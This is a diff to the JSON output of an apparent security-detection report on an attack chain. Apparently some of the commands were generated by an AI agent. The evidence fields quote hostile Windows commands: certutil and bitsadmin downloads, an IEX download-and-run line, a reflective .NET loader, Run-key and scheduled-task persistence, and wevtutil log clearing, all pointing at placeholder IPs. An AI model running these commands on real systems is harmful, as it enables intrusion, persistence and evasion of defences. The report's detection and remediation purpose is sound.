@@ -9,7 +9,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "scripts",
@@ -21,7 +22,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "outputs",
@@ -33,7 +35,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "indicators",
@@ -45,7 +48,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "indicators Domain",
@@ -57,7 +61,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "indicators EncodedCommand",
@@ -69,7 +74,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "indicators IPv4",
@@ -81,7 +87,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "indicators URL",
@@ -93,7 +100,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "activities",
@@ -105,7 +113,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "activities DownloadAndExecute",
@@ -117,7 +126,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "activities EventLogClearing",
@@ -129,7 +139,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "activities FileDownload",
@@ -141,7 +152,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "activities NativeApiCall",
@@ -153,7 +165,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "activities NetworkSocket",
@@ -165,7 +178,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "activities ProcessStart",
@@ -177,7 +191,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "activities ReflectiveCodeLoading",
@@ -189,7 +204,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "activities RunKeyPersistence",
@@ -201,7 +217,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "activities RuntimeCompilation",
@@ -213,7 +230,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "activities ScheduledTaskCreation",
@@ -225,7 +243,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "activities SignedBinaryProxyExecution",
@@ -237,7 +256,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "tactics",
@@ -249,7 +269,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "targeted",
@@ -261,7 +282,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "targeted device",
@@ -273,7 +295,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "targeted ip",
@@ -285,7 +308,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "exposed",
@@ -297,7 +321,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "exposed username",
@@ -309,7 +334,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "exposed ip",
@@ -321,103 +347,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
-  },
-  {
-    "item": "20261020_100500_step02_download.ps1",
-    "section": "script",
-    "value": "high",
-    "detail": "FileDownload",
-    "basis": null,
-    "files": null,
-    "attack": "T1105",
-    "atlas": "AML.T0072",
-    "targets": null,
-    "evidence": null
-  },
-  {
-    "item": "build_20261020_101200.xml",
-    "section": "output",
-    "value": "high",
-    "detail": "FileDownload",
-    "basis": null,
-    "files": null,
-    "attack": "T1105",
-    "atlas": "AML.T0072",
-    "targets": null,
-    "evidence": null
-  },
-  {
-    "item": "20261020_101500_step04_persist.ps1",
-    "section": "script",
-    "value": "high",
-    "detail": "RunKeyPersistence, ScheduledTaskCreation, EventLogClearing, schtasks.exe (Persistence), wevtutil (DefenseImpairment)",
-    "basis": null,
-    "files": null,
-    "attack": "T1218, T1127, T1547.001, T1053.005, T1685.005",
-    "atlas": "AML.T0142, AML.T0138",
-    "targets": null,
-    "evidence": null
-  },
-  {
-    "item": "20261020_102000_step05_dotnet.ps1",
-    "section": "script",
-    "value": "high",
-    "detail": "FileDownload",
-    "basis": null,
-    "files": null,
-    "attack": "T1105, T1620",
-    "atlas": "AML.T0072",
-    "targets": null,
-    "evidence": null
-  },
-  {
-    "item": "20261020_102500_step06_pinvoke.ps1",
-    "section": "script",
-    "value": "high",
-    "detail": "FileDownload, DownloadAndExecute, NetworkSocket",
-    "basis": null,
-    "files": null,
-    "attack": "T1105, T1059.001, T1106, T1055, T1027.004, T1059, T1047, T1095",
-    "atlas": "AML.T0072, AML.T0050, AML.T0123",
-    "targets": null,
-    "evidence": null
-  },
-  {
-    "item": "loader_20261020_102600.cs",
-    "section": "other",
-    "value": "high",
-    "detail": "FileDownload",
-    "basis": null,
-    "files": null,
-    "attack": "T1105, T1620",
-    "atlas": "AML.T0072",
-    "targets": null,
-    "evidence": null
-  },
-  {
-    "item": "20261020_103000_step07_cleanup.bat",
-    "section": "script",
-    "value": "high",
-    "detail": "FileDownload, EventLogClearing, wevtutil (DefenseImpairment)",
-    "basis": null,
-    "files": null,
-    "attack": "T1105, T1685.005",
-    "atlas": "AML.T0072, AML.T0138",
-    "targets": null,
-    "evidence": null
-  },
-  {
-    "item": "proc_20261020_103500.jsonl",
-    "section": "output",
-    "value": "high",
-    "detail": "FileDownload, ScheduledTaskCreation, EventLogClearing, schtasks (Persistence), wevtutil (DefenseImpairment)",
-    "basis": null,
-    "files": null,
-    "attack": "T1105, T1218, T1127, T1053.005, T1685.005",
-    "atlas": "AML.T0072, AML.T0138",
-    "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "corp.example",
@@ -429,7 +360,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": "nltest /dclist:corp.example >> recon_20261020_100030.txt (20261020_100000_step01_recon.ps1:2)"
+    "evidence": "nltest /dclist:corp.example >> recon_20261020_100030.txt (20261020_100000_step01_recon.ps1:2)",
+    "exposed": null
   },
   {
     "item": "203.0.113.10",
@@ -441,7 +373,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": "certutil.exe -urlcache -split -f http://203.0.113.10/a.b64 C:\\Users\\Public\\a.b64 (20261020_100500_step02_download.ps1:1)\nregsvr32.exe /s /n /u /i:http://203.0.113.10/x.sct scrobj.dll (20261020_101000_step03_exec.ps1:2)\ncertutil -urlcache -f http://203.0.113.10/c.exe %TEMP%\\c.exe (20261020_103000_step07_cleanup.bat:2)"
+    "evidence": "certutil.exe -urlcache -split -f http://203.0.113.10/a.b64 C:\\Users\\Public\\a.b64 (20261020_100500_step02_download.ps1:1)\nregsvr32.exe /s /n /u /i:http://203.0.113.10/x.sct scrobj.dll (20261020_101000_step03_exec.ps1:2)\ncertutil -urlcache -f http://203.0.113.10/c.exe %TEMP%\\c.exe (20261020_103000_step07_cleanup.bat:2)",
+    "exposed": null
   },
   {
     "item": "203.0.113.20",
@@ -453,7 +386,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": "$b64 = $wc.DownloadString(\"http://203.0.113.20/stage.txt\") (20261020_102000_step05_dotnet.ps1:2)\nIEX (New-Object Net.WebClient).DownloadString(\"http://203.0.113.20/next.ps1\") (20261020_102500_step06_pinvoke.ps1:12)"
+    "evidence": "$b64 = $wc.DownloadString(\"http://203.0.113.20/stage.txt\") (20261020_102000_step05_dotnet.ps1:2)\nIEX (New-Object Net.WebClient).DownloadString(\"http://203.0.113.20/next.ps1\") (20261020_102500_step06_pinvoke.ps1:12)",
+    "exposed": null
   },
   {
     "item": "203.0.113.30",
@@ -465,7 +399,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": "$tcp = New-Object System.Net.Sockets.TcpClient(\"203.0.113.30\", 443) (20261020_102500_step06_pinvoke.ps1:10)"
+    "evidence": "$tcp = New-Object System.Net.Sockets.TcpClient(\"203.0.113.30\", 443) (20261020_102500_step06_pinvoke.ps1:10)",
+    "exposed": null
   },
   {
     "item": "svc_build",
@@ -477,7 +412,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "203.0.113.10",
@@ -489,7 +425,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "203.0.113.20",
@@ -501,7 +438,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "203.0.113.30",
@@ -513,7 +451,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "Persistence established",
@@ -525,7 +464,8 @@
     "attack": "T1547.001, T1053.005",
     "atlas": "AML.T0142",
     "targets": "value Updater; runs rundll32.exe C:\\Users\\Public\\a.dll,Start; task Updater",
-    "evidence": "RunKeyPersistence: reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d \"rundll32.exe C:\\Users\\Public\\a.dll,Start\" /f (20261020_101500_step04_persist.ps1:2)\nScheduledTaskCreation: schtasks.exe /create /tn Updater /tr \"rundll32.exe C:\\Users\\Public\\a.dll,Start\" /sc onlogon /f (20261020_101500_step04_persist.ps1:1)\nScheduledTaskCreation: schtasks /create /tn Updater /tr \"rundll32.exe C:\\Users\\Public\\a.dll,Start\" /sc onlogon /f (proc_20261020_103500.jsonl)"
+    "evidence": "RunKeyPersistence: reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d \"rundll32.exe C:\\Users\\Public\\a.dll,Start\" /f (20261020_101500_step04_persist.ps1:2)\nScheduledTaskCreation: schtasks.exe /create /tn Updater /tr \"rundll32.exe C:\\Users\\Public\\a.dll,Start\" /sc onlogon /f (20261020_101500_step04_persist.ps1:1)\nScheduledTaskCreation: schtasks /create /tn Updater /tr \"rundll32.exe C:\\Users\\Public\\a.dll,Start\" /sc onlogon /f (proc_20261020_103500.jsonl)",
+    "exposed": null
   },
   {
     "item": "Outside hosts contacted",
@@ -537,7 +477,8 @@
     "attack": "T1105, T1059.001, T1095",
     "atlas": "AML.T0072, AML.T0050",
     "targets": "url http://203.0.113.10/a.b64; url http://203.0.113.10/b.bin; url http://203.0.113.10/c.bin; url http://203.0.113.10/d.bin; url http://203.0.113.20/stage.txt; url http://203.0.113.20/next.ps1; url http://203.0.113.20/p.bin; url http://203.0.113.10/c.exe; host 203.0.113.30",
-    "evidence": "FileDownload: certutil.exe -urlcache -split -f http://203.0.113.10/a.b64 C:\\Users\\Public\\a.b64 (20261020_100500_step02_download.ps1:1)\nFileDownload: bitsadmin.exe /transfer job /download /priority high http://203.0.113.10/b.bin C:\\Users\\Public\\b.bin (20261020_100500_step02_download.ps1:3)\nFileDownload: Start-BitsTransfer -Source http://203.0.113.10/c.bin -Destination C:\\Users\\Public\\c.bin (20261020_100500_step02_download.ps1:4)\nFileDownload: public override bool Execute() { new WebClient().DownloadFile(\"http://203.0.113.10/d.bin\", \"d.bin\"); return true; } (build_20261020_101200.xml)\nFileDownload: $b64 = $wc.DownloadString(\"http://203.0.113.20/stage.txt\") (20261020_102000_step05_dotnet.ps1:2)\nFileDownload: IEX (New-Object Net.WebClient).DownloadString(\"http://203.0.113.20/next.ps1\") (20261020_102500_step06_pinvoke.ps1:12)\nFileDownload: class L { static void Main() { var b = new WebClient().DownloadData(\"http://203.0.113.20/p.bin\"); Assembly.Load(b).EntryPoint.Invoke(null, null); } } (loader_20261020_102600.cs:4)\nFileDownload: certutil -urlcache -f http://203.0.113.10/c.exe %TEMP%\\c.exe (20261020_103000_step07_cleanup.bat:2)\nFileDownload: certutil -urlcache -split -f http://203.0.113.10/a.b64 C:\\Users\\Public\\a.b64 (proc_20261020_103500.jsonl)\nNetworkSocket: $tcp = New-Object System.Net.Sockets.TcpClient(\"203.0.113.30\", 443) (20261020_102500_step06_pinvoke.ps1:10)"
+    "evidence": "FileDownload: certutil.exe -urlcache -split -f http://203.0.113.10/a.b64 C:\\Users\\Public\\a.b64 (20261020_100500_step02_download.ps1:1)\nFileDownload: bitsadmin.exe /transfer job /download /priority high http://203.0.113.10/b.bin C:\\Users\\Public\\b.bin (20261020_100500_step02_download.ps1:3)\nFileDownload: Start-BitsTransfer -Source http://203.0.113.10/c.bin -Destination C:\\Users\\Public\\c.bin (20261020_100500_step02_download.ps1:4)\nFileDownload: public override bool Execute() { new WebClient().DownloadFile(\"http://203.0.113.10/d.bin\", \"d.bin\"); return true; } (build_20261020_101200.xml)\nFileDownload: $b64 = $wc.DownloadString(\"http://203.0.113.20/stage.txt\") (20261020_102000_step05_dotnet.ps1:2)\nFileDownload: IEX (New-Object Net.WebClient).DownloadString(\"http://203.0.113.20/next.ps1\") (20261020_102500_step06_pinvoke.ps1:12)\nFileDownload: class L { static void Main() { var b = new WebClient().DownloadData(\"http://203.0.113.20/p.bin\"); Assembly.Load(b).EntryPoint.Invoke(null, null); } } (loader_20261020_102600.cs:4)\nFileDownload: certutil -urlcache -f http://203.0.113.10/c.exe %TEMP%\\c.exe (20261020_103000_step07_cleanup.bat:2)\nFileDownload: certutil -urlcache -split -f http://203.0.113.10/a.b64 C:\\Users\\Public\\a.b64 (proc_20261020_103500.jsonl)\nNetworkSocket: $tcp = New-Object System.Net.Sockets.TcpClient(\"203.0.113.30\", 443) (20261020_102500_step06_pinvoke.ps1:10)",
+    "exposed": null
   },
   {
     "item": "Defences and logging impaired",
@@ -549,7 +490,8 @@
     "attack": "T1685.005",
     "atlas": "AML.T0138",
     "targets": "log Security; log System",
-    "evidence": "EventLogClearing: wevtutil cl Security (20261020_101500_step04_persist.ps1:3)\nEventLogClearing: wevtutil cl System (20261020_103000_step07_cleanup.bat:3)\nEventLogClearing: wevtutil cl Security (proc_20261020_103500.jsonl)"
+    "evidence": "EventLogClearing: wevtutil cl Security (20261020_101500_step04_persist.ps1:3)\nEventLogClearing: wevtutil cl System (20261020_103000_step07_cleanup.bat:3)\nEventLogClearing: wevtutil cl Security (proc_20261020_103500.jsonl)",
+    "exposed": null
   },
   {
     "item": "Code run outside normal controls",
@@ -561,7 +503,8 @@
     "attack": "T1218, T1127, T1620, T1059.001, T1105, T1106, T1055, T1027.004, T1059, T1047",
     "atlas": "AML.T0072, AML.T0050, AML.T0123",
     "targets": "call Assembly]::Load; call EntryPoint.Invoke; call Assembly.Load; function VirtualAlloc; library kernel32.dll; function CreateThread; binary rundll32; binary regsvr32; url http://203.0.113.10/x.sct; binary mshta; url http://203.0.113.10/a.hta; binary MSBuild; binary InstallUtil; url http://203.0.113.20/next.ps1; program cmd.exe",
-    "evidence": "ReflectiveCodeLoading: $asm = [System.Reflection.Assembly]::Load($out.ToArray()) (20261020_102000_step05_dotnet.ps1:11)\nReflectiveCodeLoading: $asm.EntryPoint.Invoke($null, @(,[string[]]@())) (20261020_102000_step05_dotnet.ps1:12)\nReflectiveCodeLoading: class L { static void Main() { var b = new WebClient().DownloadData(\"http://203.0.113.20/p.bin\"); Assembly.Load(b).EntryPoint.Invoke(null, null); } } (loader_20261020_102600.cs:4)\nNativeApiCall: [DllImport(\"kernel32.dll\")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p); (20261020_102500_step06_pinvoke.ps1:5)\nNativeApiCall: [DllImport(\"kernel32.dll\")] public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f, IntPtr p, uint c, IntPtr i); (20261020_102500_step06_pinvoke.ps1:6)\nSignedBinaryProxyExecution: rundll32.exe C:\\Users\\Public\\a.dll,Start (20261020_101000_step03_exec.ps1:1)\nSignedBinaryProxyExecution: regsvr32.exe /s /n /u /i:http://203.0.113.10/x.sct scrobj.dll (20261020_101000_step03_exec.ps1:2)\nSignedBinaryProxyExecution: mshta http://203.0.113.10/a.hta (20261020_101000_step03_exec.ps1:3)\nSignedBinaryProxyExecution: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe C:\\Users\\Public\\build_20261020_101200.xml (20261020_101000_step03_exec.ps1:4)\nSignedBinaryProxyExecution: cmd.exe /c \"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /U C:\\Users\\Public\\a.dll\" (20261020_101000_step03_exec.ps1:5)\nSignedBinaryProxyExecution: schtasks.exe /create /tn Updater /tr \"rundll32.exe C:\\Users\\Public\\a.dll,Start\" /sc onlogon /f (20261020_101500_step04_persist.ps1:1)\nSignedBinaryProxyExecution: reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d \"rundll32.exe C:\\Users\\Public\\a.dll,Start\" /f (20261020_101500_step04_persist.ps1:2)\nSignedBinaryProxyExecution: regsvr32 /s /n /u /i:http://203.0.113.10/x.sct scrobj.dll (proc_20261020_103500.jsonl)\nSignedBinaryProxyExecution: schtasks /create /tn Updater /tr \"rundll32.exe C:\\Users\\Public\\a.dll,Start\" /sc onlogon /f (proc_20261020_103500.jsonl)\nRuntimeCompilation: Add-Type -TypeDefinition $src (20261020_102500_step06_pinvoke.ps1:9)\nDownloadAndExecute: IEX (New-Object Net.WebClient).DownloadString(\"http://203.0.113.20/next.ps1\") (20261020_102500_step06_pinvoke.ps1:12)\nProcessStart: [System.Diagnostics.Process]::Start(\"cmd.exe\", \"/c whoami\") (20261020_102500_step06_pinvoke.ps1:11)"
+    "evidence": "ReflectiveCodeLoading: $asm = [System.Reflection.Assembly]::Load($out.ToArray()) (20261020_102000_step05_dotnet.ps1:11)\nReflectiveCodeLoading: $asm.EntryPoint.Invoke($null, @(,[string[]]@())) (20261020_102000_step05_dotnet.ps1:12)\nReflectiveCodeLoading: class L { static void Main() { var b = new WebClient().DownloadData(\"http://203.0.113.20/p.bin\"); Assembly.Load(b).EntryPoint.Invoke(null, null); } } (loader_20261020_102600.cs:4)\nNativeApiCall: [DllImport(\"kernel32.dll\")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p); (20261020_102500_step06_pinvoke.ps1:5)\nNativeApiCall: [DllImport(\"kernel32.dll\")] public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f, IntPtr p, uint c, IntPtr i); (20261020_102500_step06_pinvoke.ps1:6)\nSignedBinaryProxyExecution: rundll32.exe C:\\Users\\Public\\a.dll,Start (20261020_101000_step03_exec.ps1:1)\nSignedBinaryProxyExecution: regsvr32.exe /s /n /u /i:http://203.0.113.10/x.sct scrobj.dll (20261020_101000_step03_exec.ps1:2)\nSignedBinaryProxyExecution: mshta http://203.0.113.10/a.hta (20261020_101000_step03_exec.ps1:3)\nSignedBinaryProxyExecution: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe C:\\Users\\Public\\build_20261020_101200.xml (20261020_101000_step03_exec.ps1:4)\nSignedBinaryProxyExecution: cmd.exe /c \"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /U C:\\Users\\Public\\a.dll\" (20261020_101000_step03_exec.ps1:5)\nSignedBinaryProxyExecution: schtasks.exe /create /tn Updater /tr \"rundll32.exe C:\\Users\\Public\\a.dll,Start\" /sc onlogon /f (20261020_101500_step04_persist.ps1:1)\nSignedBinaryProxyExecution: reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d \"rundll32.exe C:\\Users\\Public\\a.dll,Start\" /f (20261020_101500_step04_persist.ps1:2)\nSignedBinaryProxyExecution: regsvr32 /s /n /u /i:http://203.0.113.10/x.sct scrobj.dll (proc_20261020_103500.jsonl)\nSignedBinaryProxyExecution: schtasks /create /tn Updater /tr \"rundll32.exe C:\\Users\\Public\\a.dll,Start\" /sc onlogon /f (proc_20261020_103500.jsonl)\nRuntimeCompilation: Add-Type -TypeDefinition $src (20261020_102500_step06_pinvoke.ps1:9)\nDownloadAndExecute: IEX (New-Object Net.WebClient).DownloadString(\"http://203.0.113.20/next.ps1\") (20261020_102500_step06_pinvoke.ps1:12)\nProcessStart: [System.Diagnostics.Process]::Start(\"cmd.exe\", \"/c whoami\") (20261020_102500_step06_pinvoke.ps1:11)",
+    "exposed": null
   },
   {
     "item": "Commands generated by an AI agent",
@@ -573,7 +516,8 @@
     "attack": null,
     "atlas": "AML.T0102",
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "Environment mapped",
@@ -584,8 +528,9 @@
     "files": "20261020_100000_step01_recon.ps1, 20261020_102500_step06_pinvoke.ps1, recon_20261020_100030.txt",
     "attack": null,
     "atlas": null,
-    "targets": "username svc_build",
-    "evidence": "whoami: whoami /all (20261020_100000_step01_recon.ps1:1)\nnltest: nltest /dclist:corp.example >> recon_20261020_100030.txt (20261020_100000_step01_recon.ps1:2)\nnet.exe: net.exe group \"Domain Admins\" /domain >> recon_20261020_100030.txt (20261020_100000_step01_recon.ps1:3)\nwmic.exe: wmic.exe process list brief (20261020_100000_step01_recon.ps1:4)\nwhoami: whoami (20261020_102500_step06_pinvoke.ps1:11)"
+    "targets": null,
+    "evidence": "whoami: whoami /all (20261020_100000_step01_recon.ps1:1)\nnltest: nltest /dclist:corp.example >> recon_20261020_100030.txt (20261020_100000_step01_recon.ps1:2)\nnet.exe: net.exe group \"Domain Admins\" /domain >> recon_20261020_100030.txt (20261020_100000_step01_recon.ps1:3)\nwmic.exe: wmic.exe process list brief (20261020_100000_step01_recon.ps1:4)\nwhoami: whoami (20261020_102500_step06_pinvoke.ps1:11)",
+    "exposed": "username: svc_build"
   },
   {
     "item": "Remove persistence",
@@ -597,7 +542,8 @@
     "attack": null,
     "atlas": null,
     "targets": "value Updater; runs rundll32.exe C:\\Users\\Public\\a.dll,Start; task Updater",
-    "evidence": "RunKeyPersistence: reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d \"rundll32.exe C:\\Users\\Public\\a.dll,Start\" /f (20261020_101500_step04_persist.ps1:2)\nScheduledTaskCreation: schtasks.exe /create /tn Updater /tr \"rundll32.exe C:\\Users\\Public\\a.dll,Start\" /sc onlogon /f (20261020_101500_step04_persist.ps1:1)\nScheduledTaskCreation: schtasks /create /tn Updater /tr \"rundll32.exe C:\\Users\\Public\\a.dll,Start\" /sc onlogon /f (proc_20261020_103500.jsonl)"
+    "evidence": "RunKeyPersistence: reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d \"rundll32.exe C:\\Users\\Public\\a.dll,Start\" /f (20261020_101500_step04_persist.ps1:2)\nScheduledTaskCreation: schtasks.exe /create /tn Updater /tr \"rundll32.exe C:\\Users\\Public\\a.dll,Start\" /sc onlogon /f (20261020_101500_step04_persist.ps1:1)\nScheduledTaskCreation: schtasks /create /tn Updater /tr \"rundll32.exe C:\\Users\\Public\\a.dll,Start\" /sc onlogon /f (proc_20261020_103500.jsonl)",
+    "exposed": null
   },
   {
     "item": "Block and hunt the infrastructure",
@@ -609,7 +555,8 @@
     "attack": null,
     "atlas": null,
     "targets": "url http://203.0.113.10/a.b64; url http://203.0.113.10/b.bin; url http://203.0.113.10/c.bin; url http://203.0.113.10/d.bin; url http://203.0.113.20/stage.txt; url http://203.0.113.20/next.ps1; url http://203.0.113.20/p.bin; url http://203.0.113.10/c.exe; host 203.0.113.30",
-    "evidence": "FileDownload: certutil.exe -urlcache -split -f http://203.0.113.10/a.b64 C:\\Users\\Public\\a.b64 (20261020_100500_step02_download.ps1:1)\nFileDownload: bitsadmin.exe /transfer job /download /priority high http://203.0.113.10/b.bin C:\\Users\\Public\\b.bin (20261020_100500_step02_download.ps1:3)\nFileDownload: Start-BitsTransfer -Source http://203.0.113.10/c.bin -Destination C:\\Users\\Public\\c.bin (20261020_100500_step02_download.ps1:4)\nFileDownload: public override bool Execute() { new WebClient().DownloadFile(\"http://203.0.113.10/d.bin\", \"d.bin\"); return true; } (build_20261020_101200.xml)\nFileDownload: $b64 = $wc.DownloadString(\"http://203.0.113.20/stage.txt\") (20261020_102000_step05_dotnet.ps1:2)\nFileDownload: IEX (New-Object Net.WebClient).DownloadString(\"http://203.0.113.20/next.ps1\") (20261020_102500_step06_pinvoke.ps1:12)\nFileDownload: class L { static void Main() { var b = new WebClient().DownloadData(\"http://203.0.113.20/p.bin\"); Assembly.Load(b).EntryPoint.Invoke(null, null); } } (loader_20261020_102600.cs:4)\nFileDownload: certutil -urlcache -f http://203.0.113.10/c.exe %TEMP%\\c.exe (20261020_103000_step07_cleanup.bat:2)\nFileDownload: certutil -urlcache -split -f http://203.0.113.10/a.b64 C:\\Users\\Public\\a.b64 (proc_20261020_103500.jsonl)\nNetworkSocket: $tcp = New-Object System.Net.Sockets.TcpClient(\"203.0.113.30\", 443) (20261020_102500_step06_pinvoke.ps1:10)"
+    "evidence": "FileDownload: certutil.exe -urlcache -split -f http://203.0.113.10/a.b64 C:\\Users\\Public\\a.b64 (20261020_100500_step02_download.ps1:1)\nFileDownload: bitsadmin.exe /transfer job /download /priority high http://203.0.113.10/b.bin C:\\Users\\Public\\b.bin (20261020_100500_step02_download.ps1:3)\nFileDownload: Start-BitsTransfer -Source http://203.0.113.10/c.bin -Destination C:\\Users\\Public\\c.bin (20261020_100500_step02_download.ps1:4)\nFileDownload: public override bool Execute() { new WebClient().DownloadFile(\"http://203.0.113.10/d.bin\", \"d.bin\"); return true; } (build_20261020_101200.xml)\nFileDownload: $b64 = $wc.DownloadString(\"http://203.0.113.20/stage.txt\") (20261020_102000_step05_dotnet.ps1:2)\nFileDownload: IEX (New-Object Net.WebClient).DownloadString(\"http://203.0.113.20/next.ps1\") (20261020_102500_step06_pinvoke.ps1:12)\nFileDownload: class L { static void Main() { var b = new WebClient().DownloadData(\"http://203.0.113.20/p.bin\"); Assembly.Load(b).EntryPoint.Invoke(null, null); } } (loader_20261020_102600.cs:4)\nFileDownload: certutil -urlcache -f http://203.0.113.10/c.exe %TEMP%\\c.exe (20261020_103000_step07_cleanup.bat:2)\nFileDownload: certutil -urlcache -split -f http://203.0.113.10/a.b64 C:\\Users\\Public\\a.b64 (proc_20261020_103500.jsonl)\nNetworkSocket: $tcp = New-Object System.Net.Sockets.TcpClient(\"203.0.113.30\", 443) (20261020_102500_step06_pinvoke.ps1:10)",
+    "exposed": null
   },
   {
     "item": "Find the delivered files",
@@ -621,7 +568,8 @@
     "attack": null,
     "atlas": null,
     "targets": "url http://203.0.113.10/a.b64; url http://203.0.113.10/b.bin; url http://203.0.113.10/c.bin; url http://203.0.113.10/d.bin; url http://203.0.113.20/stage.txt; url http://203.0.113.20/next.ps1; url http://203.0.113.20/p.bin; url http://203.0.113.10/c.exe; call Assembly]::Load; call EntryPoint.Invoke; call Assembly.Load; binary rundll32; binary regsvr32; url http://203.0.113.10/x.sct; binary mshta; url http://203.0.113.10/a.hta; binary MSBuild; binary InstallUtil; function VirtualAlloc; library kernel32.dll; function CreateThread; program cmd.exe",
-    "evidence": "FileDownload: certutil.exe -urlcache -split -f http://203.0.113.10/a.b64 C:\\Users\\Public\\a.b64 (20261020_100500_step02_download.ps1:1)\nFileDownload: bitsadmin.exe /transfer job /download /priority high http://203.0.113.10/b.bin C:\\Users\\Public\\b.bin (20261020_100500_step02_download.ps1:3)\nFileDownload: Start-BitsTransfer -Source http://203.0.113.10/c.bin -Destination C:\\Users\\Public\\c.bin (20261020_100500_step02_download.ps1:4)\nFileDownload: public override bool Execute() { new WebClient().DownloadFile(\"http://203.0.113.10/d.bin\", \"d.bin\"); return true; } (build_20261020_101200.xml)\nFileDownload: $b64 = $wc.DownloadString(\"http://203.0.113.20/stage.txt\") (20261020_102000_step05_dotnet.ps1:2)\nFileDownload: IEX (New-Object Net.WebClient).DownloadString(\"http://203.0.113.20/next.ps1\") (20261020_102500_step06_pinvoke.ps1:12)\nFileDownload: class L { static void Main() { var b = new WebClient().DownloadData(\"http://203.0.113.20/p.bin\"); Assembly.Load(b).EntryPoint.Invoke(null, null); } } 